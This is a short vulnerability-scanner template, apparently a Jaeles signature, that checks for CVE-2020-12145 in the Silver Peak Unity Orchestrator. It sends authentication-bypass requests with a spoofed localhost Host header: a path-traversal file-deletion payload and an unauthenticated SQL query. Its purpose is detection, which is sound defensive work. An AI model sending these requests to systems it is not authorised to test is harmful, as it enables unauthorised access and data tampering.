id: cve-2020–12145
info:
  name: Silver Peak Authentication Bypass — CVE-2020–12145
  risk: High

params:
  - root: "{{.BaseURL}}"

requests:
  - method: POST
    redirect: false
    url: >-
      {{.root}}/gms/rest/debugFiles/delete
    headers:
      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
      - Host: 'localhost'
      - Content-Type: application/json
    body: |
      {"fileName": "../foobar.js"}
    detections:
      - >-
        StatusCode() == 200 && StringSearch("body", "Failed to delete GMS file: ../foobar.js")

  - method: POST
    redirect: false
    url: >-
      {{.root}}/gms/rest/sqlExecution
    headers:
      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
      - Host: 'localhost'
      - Content-Type: application/json
    body: |
      {"type": "SELECT", "sql": "select database()"}
    detections:
      - >-
        StatusCode() == 200 && StringSearch("body", '[["vistapoint"]]')

references:
  - link: https://medium.com/realmodelabs/silver-peak-unity-orchestrator-rce-2928d65ef749